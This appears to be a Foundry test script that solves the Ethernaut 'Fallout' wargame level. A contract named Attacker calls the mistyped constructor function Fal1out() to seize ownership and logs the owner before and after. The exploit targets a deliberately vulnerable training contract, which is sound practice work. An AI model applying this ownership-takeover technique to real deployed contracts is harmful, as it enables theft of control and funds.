// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {Fallout} from "../instances/Ilevel02.sol";

contract Attacker is Test {
    Fallout fo = new Fallout();

    function test() external {
        vm.startBroadcast();
        console.log("Current owner is: ", fo.owner());
        fo.Fal1out();
        console.log("New owner is: ", fo.owner());
        vm.stopBroadcast();
    }
}
